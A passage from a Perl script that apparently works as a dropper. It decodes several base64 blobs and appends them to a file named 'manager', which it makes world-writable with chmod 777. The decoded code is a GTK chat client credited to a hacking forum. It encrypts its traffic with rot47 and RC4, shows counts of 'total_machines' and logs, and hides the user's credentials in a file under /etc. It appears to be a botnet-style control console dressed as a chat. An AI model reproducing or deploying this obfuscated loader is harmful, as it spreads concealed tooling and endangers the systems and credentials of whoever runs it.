rMjo6RnJhbWUtPm5ldygiUHJpdmF0ZSBFbnRyeSIpOwokUHVibGljLT5hZGQoJE1haW5FbnRyeSk7ICRQcml2YXRlLT5hZGQoJFByaXZhdGVFbnRyeSk7ICRoYm94LT5wYWNrX3N0YXJ0KCRQdWJsaWMsMSwxLDEpOyRoYm94LT5wYWNrX3N0YXJ0KCRQcml2YXRlLDEsMSwxKTsKCiRNYWluRW50cnktPnNpZ25hbF9jb25uZWN0KCdrZXlfcHJlc3NfZXZlbnQnPT4gc3ViIHsKIAkJCW15ICgkd2lkZ2V0LCRldmVudCkgPSBAXzsKIAkJCWlmKCRldmVudC0+a2V5dmFsID09ICRSZXRrZXl7UmV0dXJufSkgewogICAgICAgICAgICAgICAgICAJbXkgJG1zZ19zZW5kID0gJE1haW5FbnRyeS0+Z2V0X3RleHQ7CiAJCQkkTWFpbkVudHJ5LT5zZXRfdGV4dCgiIik7CiAJCQkkTWFpbkVudHJ5LT5ncmFiX2ZvY3VzOwogCQkJaWYgKCRtc2dfc2VuZCAhfiBtL15ccyokLyl7CgkJCW15ICRzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90byxQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwKCQkJUGVlckFkZHIgID0+ICRzZXJ2ZXJfaG9zdClvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIkNyZWF0aW5nIHNvY2tldDogJCFcbiIpOwoJCQlteSAkZW5jb2RlZDAgPSByb3Q0NygiPCR0YWdfc2VuZD4gJG1zZ19zZW5kIik7CgkJCW15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKCQkJJHNvY2stPnNlbmQoJGVuY1JDNCkgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJzZW5kOiAkIVxuIik7CiAJCQkmdXBkYXRlX2J1ZmZlcigkTmV3QnVmZm9yLCRtc2dfc2VuZCwxKTsJCiAJCQl9CnJldHVybiAxOyB9Cn0pOwoKJFByaXZhdGVFbnRyeS0+c2lnbmFsX2Nvbm5lY3QoJ2tleV9wcmVzc19ldmVudCc9PiBzdWIgewogCQkJbXkgKCR3aWRnZXQsJGV2ZW50KSA9IEBfOwogCQkJaWYoJGV2ZW50LT5rZXl2YWwgPT0gJFJldGtleXtSZXR1cm59KSB7CgkJCW15ICR0cmVlc2VsZWN0aW9uID0gJHRyZWVfdmlldy0+Z2V0X3NlbGVjdGlvbjsKCQkJJHRyZWVzZWxlY3Rpb24tPnNlbGVjdGVkX2ZvcmVhY2ggKHN1YnsgCgkJCW15ICgkbW9kZWwsJHBhdGgsJGl0ZXIpID1AXzsKCQkJbXkgJHZhbHVlID0gJG1vZGVsLT5nZXQoJGl0ZXIsMCk7CiAJCQlteSAkbXNnX3NlbmQgPSAkUHJpdmF0ZUVudHJ5LT5nZXRfdGV4dDsKIAkJCSRQcml2YXRlRW50cnktPnNldF90ZXh0KCIiKTsKIAkJCSRQcml2YXRlRW50cnktPmdyYWJfZm9jdXM7CiAJCQlpZiAoJG1zZ19zZW5kICF+IG0vXlxzKiQvKXsKCQkJbXkgJFJlYWR5VmFsdWUgPSBzdWJzdHIoJHZhbHVlLCAwLCAtNCk7CgkJCW15ICRzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90byxQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwKCQkJUGVlckFkZHIgID0+ICRzZXJ2ZXJfaG9zdClvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIkNyZWF0aW5nIHNvY2tldDogJCFcbiIpOwoJCQlteSAkZW5jb2RlZDAgPSByb3Q0NygidG9fdXNlciRKJFJlYWR5VmFsdWUkSiR0YWdfc2VuZCRKJG1zZ19zZW5kIik7CgkJCW15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKCQkJJHNvY2stPnNlbmQoJGVuY1JDNCkgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJzZW5kOiAkIVxuIik7CiAJCQkmdXBkYXRlX2J1ZmZlcigkTmV3QnVmZm9yMiwkbXNnX3NlbmQsMSk7CQogCQkJfQogCQl9KTsKcmV0dXJuIDE7IH0KfSk7CgokdmJveC0+cGFja19zdGFydCgkaGJveCwxLDEsNCk7CiR2Ym94LT5zZXRfZm9jdXNfY2hpbGQoJGhib3gpOwokdmJveC0+c2hvd19hbGwoKTsKcmV0dXJuICR2Ym94Owp9Cg==
";
my $part5 = "
CnN1YiB3YXRjaF9jYWxsYmFjayB7Cm15ICgkZmgsJE5ld1RWaWV3KSA9IEBfOwpteSAkbXNnOyAKJGZoLT5yZWN2KCRtc2csICRNQVhMRU4pIG9yICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAiRXJyb3IgcmVjdjogJCEgXG4iKTsKbXkgJGJ1ZmZlciA9ICROZXdUVmlldy0+Z2V0X2J1ZmZlcigpOwpteSAkTmV3QnVmZiA9ICROZXdUVmlldzItPmdldF9idWZmZXIoKTsKCQlteSAkZGVjUkM0ID0gUkM0KCAkcGFzcywgJG1zZyApOwoJCW15ICRkZWNvZGVkID0gcm90NDcoJGRlY1JDNCk7CgkJbXkgQHdvcmRzID0gc3BsaXQoLyRKLywgJGRlY29kZWQpOwoJCWlmKCR3b3Jkc1swXSBlcSAibWFpbl9zdGF0cyIpeyAKCQkkdG90YWxfbWFjaGluZXMtPnNldF90ZXh0KCR3b3Jkc1sxXSk7CgkJJHRvdGFsX21hY2hpbmVzMi0+c2V0X3RleHQoJHdvcmRzWzJdKTsKCQkkdG90YWxfbWFjaGluZXMzLT5zZXRfdGV4dCgkd29yZHNbM10pOwoJCSR0b3RhbF9tYWNoaW5lczQtPnNldF90ZXh0KCR3b3Jkc1s0XSk7CgkJfSBlbHNpZiAoJHdvcmRzWzBdIGVxICJ0aGVfc3RhdHMiKXsKCQlteSAkYnVmZkV4TWFpbiA9ICRtYWludmlldy0+Z2V0X2J1ZmZlcigpOwoJCW15ICRidWZmRXhNYWluMiA9ICRtYWludmlldzItPmdldF9idWZmZXIoKTsKCQlteSAkYnVmZkV4TWFpbjMgPSAkbWFpbnZpZXczLT5nZXRfYnVmZmVyKCk7CgkJbXkgJGJ1ZmZFeE1haW40ID0gJG1haW52aWV3NC0+Z2V0X2J1ZmZlcigpOwoJCW15ICRidWZmRXhNYWluNSA9ICRtYWludmlldzUtPmdldF9idWZmZXIoKTsKCQlteSAkYnVmZkV4TWFpbjYgPSAkbWFpbnZpZXc2LT5nZXRfYnVmZmVyKCk7CgkJJGJ1ZmZFeE1haW4tPmluc2VydCAoJGJ1ZmZFeE1haW4tPmdldF9lbmRfaXRlciwgIlx0XHQiLiR3b3Jkc1sxXS4iXG4iKTsKCQkkYnVmZkV4TWFpbjItPmluc2VydCAoJGJ1ZmZFeE1haW4yLT5nZXRfZW5kX2l0ZXIsICJcdFx0Ii4kd29yZHNbMl0uIlxuIik7CgkJJGJ1ZmZFeE1haW4zLT5pbnNlcnQgKCRidWZmRXhNYWluMy0+Z2V0X2VuZF9pdGVyLCAiXHRcdCIuJHdvcmRzWzNdLiJcbiIpOwoJCSRidWZmRXhNYWluNC0+aW5zZXJ0ICgkYnVmZkV4TWFpbjQtPmdldF9lbmRfaXRlciwgIlx0XHQiLiR3b3Jkc1s0XS4iXG4iKTsKCQkkYnVmZkV4TWFpbjUtPmluc2VydCAoJGJ1ZmZFeE1haW41LT5nZXRfZW5kX2l0ZXIsICJcdFx0Ii4kd29yZHNbNV0uIlxuIik7CgkJfWVsc2lmICgkd29yZHNbMF0gZXEgImwwZyIpewoJCSRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAkd29yZHNbMV0uIlxuIik7CgkJfWVsc2lmKCRkZWNvZGVkIGVxICJhdXRoX25vdXNlciIpewoJCSRVbHRpbWF0ZUJ1ZmZFeC0+aW5zZXJ0ICgkVWx0aW1hdGVCdWZmRXgtPmdldF9lbmRfaXRlciwgInlvdSBhcmUgbm90IHJlZ2lzdGVyZWQsIHBsZWFzZSByZWdpc3RlciB0byBiZSBhYmxlIHRvIHVzZSBvdXIgY2hhdCA6KVxuIik7CgkJfWVsc2lmKCRkZWNvZGVkIGVxICJhdXRoX25vdG9rIikgeyRVbHRpbWF0ZUJ1ZmZFeC0+aW5zZXJ0ICgkVWx0aW1hdGVCdWZmRXgtPmdldF9lbmRfaXRlciwgInVzZXJuYW1lIG9yIHBhc3N3b3JkIGluY29ycmVjdCwgcGxlYXNlIHRyeSBhZ2FpbiFcbiIpOwoJCX1lbHNpZigkZGVjb2RlZCBlcSAiYXV0aF9vayIpeyAkVWx0aW1hdGVCdWZmRXgtPmluc2VydCAoJFVsdGltYXRlQnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJMb2dnZWQgSW4hIEhpdCAnVXBkYXRlIFVzZXJzJyBCdXR0b24gdG8gc2VlIHVzZXIgbGlzdCA7KVxuIik7CgkJfWVsc2lmKCRkZWNvZGVkIGVxICJyZWdfb2siKXsgJFVsdGltYXRlQnVmZkV4LT5pbnNlcnQgKCRVbHRpbWF0ZUJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAiTG9nZ2VkIEluIGFuZCByZWdpc3RlcmVkISBQbGVhc2UgaGl0ICdVcGRhdGUgVXNlcnMnIEJ1dHRvbiB0byBzZWUgdXNlciBsaXN0IDspXG4iKTsKCQlvcGVuIChGNSwgIj4+L2V0Yy8uUC5JLkNfREFUQS50eHQiKTsgcHJpbnQgRjUgY3J5KCRtc2dfc2VuZCk7IGNsb3NlIChGNSk7CgkJb3BlbihGMiwiL2V0Yy8uUC5JLkNfREFUQS50eHQiKSB8fCAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIk5vIGRhdGEhIEhhdmUgeW91IHJlZ2lzdGVyZWQ/XG4iKTsgCgkJbXkgJGRldGFpbHMgPSBkZWNyeSg8RjI+KTsKCQlAbG9naW5fcGFzcyA9IHNwbGl0KC8kSi8sICRkZXRhaWxzKTsKCQkkcm9vdGxvZ2luID0gJGxvZ2luX3Bhc3NbMF07ICRyb290cGFzc3dkID0gJGxvZ2luX3Bhc3NbMV07CgkJJHRhZ19zZW5kID0gJGxvZ2luX3Bhc3NbMF07CgkJfWVsc2lmKCRkZWNvZGVkIGVxICJyZWdfbm90b2siKSB7JFVsdGltYXRlQnVmZkV4LT5pbnNlcnQgKCRVbHRpbWF0ZUJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAiQWNjb3VudCBhbGxyZWFkeSBpbiB1c2UhIFRyeSBzb21ldGhpbmcgZGlmZmVyZW50LlxuIik7CgkJfWVsc2lmKCR3b3Jkc1swXSBlcSAidXNlcnMiKSB7CgkJJG51bWJlcl9vZl91c2VycyA9ICR3b3Jkc1sxXTsKCQkkVWx0aW1hdGVCdWZmRXgtPmluc2VydCAoJFVsdGltYXRlQnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJOciBvZiB1c2VyczogJG51bWJlcl9vZl91c2Vyc1xuIik7CgkJZm9yZWFjaCgxLi4yKyRudW1iZXJfb2ZfdXNlcnMpewoJCSR1c2Vyc19jb250YWluZXIgLj0gJHdvcmRzWyRpKytdOwoJCSR1c2Vyc19jb250YWluZXIgLj0gIlxuIjsKCQl9CgkJcHJpbnQgJHVzZXJzX2NvbnRhaW5lci4iXG4iOwoJCUB3b3JkID0gKCR1c2Vyc19jb250YWluZXIgPX4gLyhcdyspL2cpOwoJCSR4YXhhID0gIGpvaW4gIiRKIiwgQHdvcmRbMi4uJG51bWJlcl9vZl91c2VycysyXTsKCQl9IGVsc2lmKCR3b3Jkc1swXSBlcSAibm90X2xvZ2dlZCIpIHsKCQkkVWx0aW1hdGVCdWZmRXgtPmluc2VydCAoJFVsdGltYXRlQnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJZb3UgYXJlIG5vdCBsb2dnZWQgdG8gdGhlIHN5c3RlbS4gUGxlYXNlIExvZyBpbi5cbiIpOwoJCX0gZWxzaWYoJHdvcmRzWzBdIGVxICJmcm9tX3VzZXIiKSB7CgkJbXkgJFNvdXJjZVVzZXIgPSAkd29yZHNbMV07IG15ICRTb3VyY2VNU0cgPSAkd29yZHNbMl07CgkJbXkgJFJlYWR5ID0gIjwkU291cmNlVXNlcj4gJFNvdXJjZU1TRyI7CgkJJnVwZGF0ZV9idWZmZXIoJE5ld0J1ZmYsJFJlYWR5LDApOwoJCX0KCQllbHNlIHsKIAkJJnVwZGF0ZV9idWZmZXIoJGJ1ZmZlciwkZGVjb2RlZCwwKTsKCX0KcmV0dXJuIDE7Cn0KIApHdGsyLT5tYWluOwogCnN1YiB1bmRlcmxpbmUgewpteSAoJGJ1ZmYsJHNoZWxsLCRzZW5kKT0gQF87Cm15ICRpdGVyID0gJGJ1ZmYtPmdldF9lbmRfaXRlcjsKJGJ1ZmYtPmluc2VydF93aXRoX3RhZ3NfYnlfbmFtZSgkaXRlciwgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0+PlxuIik7Cn0KCnN1YiB1cGRhdGVfYnVmZmVyIHsKbXkgKCRidWZmZXIsJG1zZywkc2VuZCk9IEBfOwokbXNnID0gJG1zZy4iXG4iOwppZiAoJHNlbmQpIHsKbXkgJGl0ZXIgPSAkYnVmZmVyLT5nZXRfZW5kX2l0ZXI7CiRidWZmZXItPmluc2VydF93aXRoX3RhZ3NfYnlfbmFtZSgkaXRlciwgIjwkdGFnX3NlbmQ+ICRtc2ciKTsKfWVsc2V7Cm15ICRpdGVyID0gJGJ1ZmZlci0+Z2V0X2VuZF9pdGVyOwokYnVmZmVyLT5pbnNlcnRfd2l0aF90YWdzX2J5X25hbWUoJGl0ZXIsICRtc2csJHRhZ19yZWNlaXZlKTsgCQogCX0KIH0KCnN1YiBNZXNzYWdlQm94IHsgbXkgJG1lc3NhZ2UgPSBzaGlmdDsgbXkgJHRpdGxlID0gc2hpZnQ7Cm15ICRkaWFsb2cgPSBHdGsyOjpEaWFsb2ctPm5ldyAoJHRpdGxlLCAkd2luZG93LCAnZGVzdHJveS13aXRoLXBhcmVudCcsICdndGstb2snID0+ICdub25lJyk7Cm15ICRsYWJlbCA9IEd0azI6OkxhYmVsLT5uZXcgKCRtZXNzYWdlKTsgJGRpYWxvZy0+dmJveC0+YWRkICgkbGFiZWwpOwokZGlhbG9nLT5zaWduYWxfY29ubmVjdCAocmVzcG9uc2UgPT4gc3ViIHsgJF9bMF0tPmRlc3Ryb3kgfSk7ICRkaWFsb2ctPnNob3dfYWxsO30KCnN1YiBBYm91dCB7Ck1lc3NhZ2VCb3goCiIgUHJpdmF0ZSBJbnRlcm5ldCBDb21tdW5pY2F0aW9uIENoYXQgU3lzdGVtIGNvZGVkIGJ5IGNyb3NzIDxjcm9zc1xAeDFtYWNoaW5lLmNvbT4gLyAKIGNzcnNzIGZyb20gaHR0cDovL2ZvcnVtLmFudGljaGF0LnJ1CiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogVG8gcmVnaXN0ZXIgc2ltcGx5IHR5cGUgaW4gTWFpbiBFbnRyeSBkZXNpcmVkIHVzZXJuYW1lIHBhc3N3b3JkIGFuZCB5b3VyIHZhbGlkIGVtYWlsIGFkZHJlc3MsIHNlcGFyYXRlZCB3aXRoIAogJyRKJyAsIGxpa2UgIHRoaXMkSiB5b3VyX25hbWUkSlx5b3VyX3Bhc3MkSlx5b3VyX21haWwgYW5kIHRoZW4gaGl0ICdSZWdpc3RlcicgYnV0dG9uLiBTY3JpcHQgd2lsbCBzZW5kIHlvdXIgcmVxdWVzdCB0byAKIHRoZSBzZXJ2ZXIsIHRoYXQgd2lsbCB0cnkgdG8gcmVnaXN0ZXIgeW91LiBBZnRlciBzdWNjZXNzZnVsIHJlZ2lzdHJhdGlvbiB5b3Ugd2lsbCBiZSBhYmxlIHRvIGpvaW4gUC5JLkMuIGNoYXQgOikKIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIElmIHlvdSBoYXZlIGFsbHJlYWR5IHJlZ2lzdGVyZWQgYnV0IHRoZXJlIGlzIHNvbWUgaXNzdWUgd2l0aCBhdXRvIGxvZ2luLCBzaW1wbHkgdHlwZSBpbiBNYWluIEVudHJ5IHlvdXIgbG9naW4gCiBhbmQgcGFzc3dvcmQsIHNlcGFyYXRlZCB3aXRoICckSicgbGlrZSB0aGlzOiAgeW91cl9uYW1lJEpceW91cl9wYXNzIGFuZCBoaXQgJ0xvZ2luJyBidXR0b24uIAogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiBCeSBUaGUgV2F5LCB0aGlzIGNvbnNvbGUgd2lsbCBjcmVhdGUgYSBoaWRkZW4gZmlsZSBpbnNpZGUgL2V0YyBkaXJlY3RvcnksIGluIHdoaWNoIGl0IHdpbGwgc3RvcmUgeW91ciBhY2NvdW50IGRldGFpbGVzIAogdG8gYmUgYWJsZSB0byBhdXRvIGxvZyB5b3UgaW4uCiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIE9uZSBtb3JlIHRoaW5nLCB0aGVyZSBpcyBubyAnU2VuZCBtZXNzYWdlJyBib3R0b25zLiBZb3UgZG9udCBuZWVkIHRoZW0sIHNpbXBseSBhZnRlciB5b3UgaGF2ZSBlbnRlcmVkIHlvdXIgCiBtZXNzYWdlLCBoaXQgRU5URVIgb24geW91ciBrZXlib2FyZCBhbmQgeW91ciBtZXNzYWdlIHdpbGwgYmUgc2VudC4gSSB0aGluayBubyBvbmUgaXMgdXNpbmcgc3VjaCBidXR0b25zIHNvIAogaSBoYXZlIGRlY2lkZWQgdG8gbm90IHRvIGFkZCB0aGVtLgogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiBOb3cgc21hbGwgZXhhbXBsYW5hdGlvbiwgaG93IHRvIHVzZSB0aGlzIHRoaW5nLiBBZnRlciB5b3Ugd2lsbCByZWdpc3RlciBhbiBhY2NvdW50LCBoaXQgJ1VwZGF0ZSB1c2VyIGxpc3QnIAogYnV0dG9uIHRvIHNlZSB3aG8gaXMgaGVyZSwgd2hvIGlzIG9ubGluZSBhbmQgd2hvIGlzIG9mZmxpbmUuIE9ubGluZSBwZW9wbGUgYXJlIGluZGljYXRlZCBieSBbK10sIG9mZmxpbmUgLSBbLV0uCiBTb21ldGltZXMgeW91IG5lZWQgdG8gcmVmcmVzaCB1c2VycyB0d2ljZSB0byBzZWUgY2hhbmdlcy4gSW4gbWFpbiBlbnRyeSB5b3UgYXJlIHdyaXRpbmcgbWVzc2FnZXMgdG8gCiBldmVyeW9uZSBvbmxpbmU7IHByaXZhdGUgZW50cnkgc2VuZHMgeW91ciBtZXNzYWdlIG9ubHkgdG8gc2VsZWN0ZWQgdXNlci4gVG8gc2VuZCBwcml2YXRlIG1lc3NhZ2UsIHlvdSAKIG5lZWQgdG8gc2VsZWN0IHVzZXIgZnJvbSB1c2VyIGxpc3QsIHR5cGUgeW91ciBtc2cgYW5kIGhpdCBFTlRFUi4gVGhhdHMgaXQuIEhhdmUgZnVuLgogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiBQbGVhc2UsIHNlbmQgYW55IGJ1Z3MgeW91J2xsIGZpbmQgdG8gbWUgKHlvdSBjYW4gc2VlIG15IGVtYWlsIGFkZHJlc3MgdXAgdGhlcmUpIHNvIGkgY2FuIGltcHJvdmUgdGhlIHNjcmlwdC4gIAogQWxzbyBpZiB5b3Ugd2FudCBpdCB0byBncm93LCB3YW50IHRvIGFkZCBzb21ldGhpbmcsIHdoYXRldmVyLCBjb250YWN0IG1lLgoiLCAiQUJPVVQiICk7fQ==
";
my $file1 = "manager";
open(LOGFILE,">>$file1") or die("Cannot create file $file1!\n");
        print LOGFILE ("$part1");
	print LOGFILE (decry($part2));
	print LOGFILE (decry($part3));
	print LOGFILE (decry($part4));
	print LOGFILE (decry($part5));
        close(LOGFILE);
	system ("chmod 777 $file1");
}








